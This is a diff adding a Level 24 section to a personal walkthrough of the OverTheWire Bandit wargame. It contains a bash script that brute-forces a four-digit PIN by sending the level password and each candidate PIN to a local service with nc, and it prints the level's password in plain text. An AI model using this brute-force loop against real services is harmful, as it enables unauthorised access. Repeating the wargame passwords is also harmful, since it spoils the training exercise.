@@ -500,3 +500,36 @@ cat: file: No such file or directory
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 bandit23@bandit:/tmp/bandit23_pithei$
 ```
+
+## Level 24
+```bash
+bandit24@bandit:~$ mkdir /tmp/bandit24_pithei
+bandit24@bandit:~$ cd /tmp/bandit24_pithei
+bandit24@bandit:/tmp/bandit24_pithei$
+
+bandit24@bandit:/tmp/bandit24_pithei$ touch pithei_bandit24_to_25.sh
+bandit24@bandit:/tmp/bandit24_pithei$ chmod +x pithei_bandit24_to_25.sh
+
+#!/bin/bash
+bandit24_pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+for first in {0..9}
+	do
+		for second in {0..9}
+		do
+			for third in {0..9}
+			do
+				for fourth in {0..9}
+				do
+					echo "trying" $bandit24_pass $first$second$third$fourth >> result.txt
+					echo $bandit24_pass $first$second$third$fourth | nc localhost 30002 >> result.txt &
+					sleep 2
+				done
+			done
+		done
+	done
+ 
+ # ^D
+
+./pithei_bandit24_to_25.sh &
+tail -f result.txt
+```
